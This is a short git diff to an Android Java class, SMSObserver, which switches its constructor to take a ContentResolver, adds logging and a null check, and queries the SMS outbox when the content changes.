@@ -4,29 +4,37 @@ import java.sql.Date;
 import java.text.SimpleDateFormat;
 import java.util.HashMap;
 
+import android.content.ContentResolver;
 import android.content.Context;
 import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
+import android.util.Log;
 
 public class SMSObserver extends ContentObserver{
 
-	private Context context;
+	private ContentResolver resolver;
+	private static final String TAG = "SMSObserver";
 	
-	public SMSObserver(Handler handler, Context context) {
+	public SMSObserver(Handler handler, ContentResolver resolver) {
 		super(handler);
-		this.context = context;
+		this.resolver = resolver;
+		Log.v(TAG, "Construct SMSObserver");
 		// TODO Auto-generated constructor stub
 	}
 	
+
 	@Override
 	public void onChange(boolean selfChange){
 		//TODO Auto-generated method stub
 		//查询发件箱中的短信
-		Cursor cursor = context.getContentResolver().query(
+		Log.v(TAG, "here come into onChange function");
+		Cursor cursor = resolver.query(
 				Uri.parse("content://sms/outbox"), null, null, null, null);
-		
+		if(cursor == null) {
+			Log.v(TAG, "error: cursor is null");
+		}
 		while(cursor.moveToNext()){
 //			StringBuffer sb = new StringBuffer();
 			//get send phone number
